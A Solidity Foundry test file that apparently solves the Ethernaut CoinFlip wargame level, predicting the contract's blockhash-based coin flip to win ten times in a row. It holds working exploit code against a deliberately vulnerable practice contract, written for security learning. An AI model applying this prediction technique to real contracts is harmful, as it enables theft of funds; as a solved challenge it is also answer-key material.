// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/CoinFlip.sol";
import "src/levels/CoinFlipFactory.sol";

import "@openzeppelin/contracts/math/SafeMath.sol";

contract TestCoinFlip is BaseTest {
    using SafeMath for uint256;

    CoinFlip private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new CoinFlipFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /**
         * CODE YOUR SETUP HERE
         */
        levelAddress = payable(this.createLevelInstance(true));
        level = CoinFlip(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.consecutiveWins(), 0);
    }

    function exploitLevel() internal override {
        /**
         * CODE YOUR EXPLOIT HERE
         */

        // The idea here is that even if factor is private, we can still see its value on blockchain
        // Internally, blockchain is not completely random, so here we can predict the coin flip

        vm.startPrank(player);

        uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

        while (level.consecutiveWins() < 10) {
            // Get the blockhash and calculate the coin flip
            uint256 result = (uint256(blockhash(block.number.sub(1)))).div(factor);

            // Make the guess
            level.flip(result == 1 ? true : false);

            // Mine 1 block to pass the check
            vm.roll(block.number + 1);
        }

        vm.stopPrank();
    }
}
